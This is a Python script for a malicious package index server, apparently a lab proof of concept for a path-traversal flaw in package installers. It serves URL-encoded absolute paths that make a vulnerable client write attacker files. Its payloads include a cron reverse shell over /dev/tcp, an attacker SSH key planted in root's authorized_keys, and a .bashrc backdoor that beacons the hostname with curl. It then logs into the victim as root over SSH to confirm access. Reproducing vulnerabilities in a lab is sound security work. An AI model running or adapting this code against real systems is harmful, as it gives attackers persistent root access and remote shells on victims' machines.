#!/usr/bin/env python3
"""
Malicious Package Index Server

This server simulates a compromised PyPI mirror that serves
packages with path traversal payloads in the download URLs.

Runs on port 8080 and waits for victim connections.
"""

import http.server
import os
import socketserver
import subprocess
import sys
from urllib.parse import quote, unquote

PORT = 8080
SSH_KEY_DIR = "/root/.ssh"
SSH_PRIVATE_KEY = f"{SSH_KEY_DIR}/attacker_key"
SSH_PUBLIC_KEY = f"{SSH_KEY_DIR}/attacker_key.pub"

# Will be populated at startup
ATTACKER_PUBLIC_KEY = ""

# =============================================================================
# ATTACK SCENARIOS
# =============================================================================

def get_scenarios():
    """Return scenarios with current public key."""
    return {
        "cron": {
            "target": "/etc/cron.d/backdoor",
            "payload": b"""# Malicious cron job - reverse shell every minute
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/server/4444 0>&1'
""",
            "description": "Cron job reverse shell to attacker",
        },
        "ssh": {
            "target": "/root/.ssh/authorized_keys",
            "payload": f"""# Attacker's SSH key for persistent access
{ATTACKER_PUBLIC_KEY}
""".encode(),
            "description": "SSH authorized_keys injection",
        },
        "bashrc": {
            "target": "/home/victim/.bashrc",
            "payload": b"""# Backdoored .bashrc - executes on every new shell
export PATH=$PATH:/usr/local/bin
curl -s http://server:8080/beacon?h=$(hostname) &>/dev/null &
echo "[BACKDOOR] Beacon sent to attacker server"
""",
            "description": "Bashrc backdoor with beacon",
        },
    }


# Current active scenario
ACTIVE_SCENARIO = "cron"

# Track beacon callbacks
BEACONS_RECEIVED = []


def generate_ssh_keypair():
    """Generate SSH keypair for the attacker."""
    global ATTACKER_PUBLIC_KEY

    os.makedirs(SSH_KEY_DIR, exist_ok=True)

    if not os.path.exists(SSH_PRIVATE_KEY):
        print("[SERVER] Generating SSH keypair for attacker...")
        subprocess.run([
            "ssh-keygen", "-t", "ed25519", "-f", SSH_PRIVATE_KEY,
            "-N", "", "-C", "attacker@malicious-pypi"
        ], check=True, capture_output=True)
        print(f"[SERVER] SSH keypair generated: {SSH_PRIVATE_KEY}")

    with open(SSH_PUBLIC_KEY, 'r') as f:
        ATTACKER_PUBLIC_KEY = f.read().strip()

    print(f"[SERVER] Attacker public key: {ATTACKER_PUBLIC_KEY[:50]}...")


class MaliciousIndexHandler(http.server.BaseHTTPRequestHandler):
    """Malicious PyPI-like index server."""

    def log_message(self, format, *args):
        print(f"[SERVER] {args[0]}")

    def do_GET(self):
        path = self.path.split('#')[0]
        query = ""
        if '?' in path:
            path, query = path.split('?', 1)

        if path in ('/', '/simple/', '/simple'):
            self.serve_index()
        elif '/simple/malicious-package' in path:
            self.serve_package_links()
        elif '/scenario/' in path:
            self.set_scenario(path)
        elif '/status' in path:
            self.serve_status()
        elif '/beacon' in path:
            self.handle_beacon(query)
        elif '/validate/ssh' in path:
            self.validate_ssh_access()
        elif '/pubkey' in path:
            self.serve_pubkey()
        else:
            self.serve_payload()

    def serve_index(self):
        """Serve the main package index."""
        html = """<!DOCTYPE html>
<html><head><title>Malicious PyPI</title></head>
<body>
<h1>Evil Package Index</h1>
<a href="/simple/malicious-package/">malicious-package</a>
</body></html>"""
        self.send_html(html)
        print("[SERVER] Served package index")

    def serve_package_links(self):
        """Serve package page with malicious download link."""
        scenarios = get_scenarios()
        scenario = scenarios[ACTIVE_SCENARIO]
        target = scenario["target"]
        encoded = quote(target, safe='')

        html = f"""<!DOCTYPE html>
<html><head><title>malicious-package</title></head>
<body>
<h1>Links for malicious-package</h1>
<a href="/{encoded}#egg=malicious-package-1.0">malicious-package-1.0.tar.gz</a>
</body></html>"""

        self.send_html(html)
        print(f"[SERVER] Served malicious link -> {target}")
        print(f"[SERVER] URL-encoded as: /{encoded}")

    def serve_payload(self):
        """Serve the malicious payload."""
        decoded = unquote(self.path)
        scenarios = get_scenarios()
        scenario = scenarios[ACTIVE_SCENARIO]
        payload = scenario["payload"]

        print(f"[SERVER] Client downloading: {decoded}")
        print(f"[SERVER] Sending {len(payload)} byte payload")

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(payload))
        self.end_headers()
        self.wfile.write(payload)

    def set_scenario(self, path):
        """Switch active scenario."""
        global ACTIVE_SCENARIO
        name = path.split('/')[-1]
        scenarios = get_scenarios()
        if name in scenarios:
            ACTIVE_SCENARIO = name
            self.send_html(f"<h1>Scenario set to: {name}</h1>")
            print(f"[SERVER] Scenario changed to: {name}")
        else:
            self.send_html(f"<h1>Unknown scenario: {name}</h1>", 404)

    def serve_status(self):
        """Show current server status."""
        scenarios = get_scenarios()
        scenario = scenarios[ACTIVE_SCENARIO]
        beacons_html = "<li>".join(BEACONS_RECEIVED) if BEACONS_RECEIVED else "None yet"

        html = f"""<!DOCTYPE html>
<html><head><title>Server Status</title></head>
<body>
<h1>Malicious Server Status</h1>
<p><b>Active Scenario:</b> {ACTIVE_SCENARIO}</p>
<p><b>Target Path:</b> {scenario['target']}</p>
<h2>Available Scenarios:</h2>
<ul>
<li><a href="/scenario/cron">cron</a> - /etc/cron.d/backdoor</li>
<li><a href="/scenario/ssh">ssh</a> - /root/.ssh/authorized_keys</li>
<li><a href="/scenario/bashrc">bashrc</a> - ~/.bashrc beacon</li>
</ul>
<h2>Validation Endpoints:</h2>
<ul>
<li><a href="/validate/ssh">/validate/ssh</a> - Attempt SSH to victim</li>
<li><a href="/pubkey">/pubkey</a> - Show attacker public key</li>
</ul>
<h2>Beacons Received:</h2>
<ul><li>{beacons_html}</li></ul>
</body></html>"""
        self.send_html(html)

    def handle_beacon(self, query):
        """Handle beacon callbacks from backdoored bashrc."""
        import time
        from urllib.parse import parse_qs

        params = parse_qs(query)
        hostname = params.get('h', ['unknown'])[0]
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

        beacon_info = f"{timestamp} - {hostname}"
        BEACONS_RECEIVED.append(beacon_info)

        print(f"\n{'='*60}")
        print(f"[BEACON RECEIVED] Host: {hostname} at {timestamp}")
        print(f"[IOC] Bashrc backdoor successfully triggered!")
        print(f"{'='*60}\n")

        self.send_response(200)
        self.end_headers()

    def validate_ssh_access(self):
        """Attempt to SSH into the victim to validate key injection."""
        print(f"\n{'='*60}")
        print("[VALIDATION] Attempting SSH connection to victim...")
        print(f"{'='*60}")

        try:
            result = subprocess.run([
                "ssh", "-i", SSH_PRIVATE_KEY,
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-o", "ConnectTimeout=5",
                "root@client",
                "echo 'SSH_ACCESS_CONFIRMED'; hostname; id; cat /etc/cron.d/backdoor 2>/dev/null || true"
            ], capture_output=True, text=True, timeout=10)

            if "SSH_ACCESS_CONFIRMED" in result.stdout:
                print(f"[SSH VALIDATION SUCCESS]")
                print(f"Output from victim:\n{result.stdout}")

                html = f"""<!DOCTYPE html>
<html><head><title>SSH Validation</title></head>
<body>
<h1 style="color: red;">SSH ACCESS CONFIRMED!</h1>
<h2>Attacker successfully connected to victim via injected SSH key</h2>
<pre>{result.stdout}</pre>
<p><b>IOC:</b> Unauthorized SSH key in /root/.ssh/authorized_keys</p>
</body></html>"""
                self.send_html(html)
            else:
                print(f"[SSH VALIDATION FAILED]")
                print(f"stdout: {result.stdout}")
                print(f"stderr: {result.stderr}")
                self.send_html(f"<h1>SSH Failed</h1><pre>{result.stderr}</pre>", 500)

        except subprocess.TimeoutExpired:
            print("[SSH VALIDATION TIMEOUT]")
            self.send_html("<h1>SSH Timeout</h1>", 500)
        except Exception as e:
            print(f"[SSH VALIDATION ERROR] {e}")
            self.send_html(f"<h1>SSH Error</h1><pre>{e}</pre>", 500)

    def serve_pubkey(self):
        """Serve the attacker's public key."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(ATTACKER_PUBLIC_KEY.encode())

    def send_html(self, content, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode())


def main():
    # Generate SSH keypair first
    generate_ssh_keypair()

    print("=" * 60)
    print("MALICIOUS PACKAGE INDEX SERVER")
    print("=" * 60)
    print(f"\nListening on 0.0.0.0:{PORT}")
    print(f"Active scenario: {ACTIVE_SCENARIO}")
    scenarios = get_scenarios()
    print(f"Target: {scenarios[ACTIVE_SCENARIO]['target']}")
    print("\nEndpoints:")
    print(f"  http://server:{PORT}/simple/          - Package index")
    print(f"  http://server:{PORT}/status           - Server status")
    print(f"  http://server:{PORT}/validate/ssh     - Validate SSH access")
    print(f"  http://server:{PORT}/beacon           - Beacon receiver")
    print(f"  http://server:{PORT}/scenario/cron    - Switch to cron attack")
    print(f"  http://server:{PORT}/scenario/ssh     - Switch to SSH attack")
    print(f"  http://server:{PORT}/scenario/bashrc  - Switch to bashrc attack")
    print("\n" + "=" * 60)
    print("Waiting for victim connections...")
    print("=" * 60 + "\n")

    with socketserver.TCPServer(("0.0.0.0", PORT), MaliciousIndexHandler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    main()
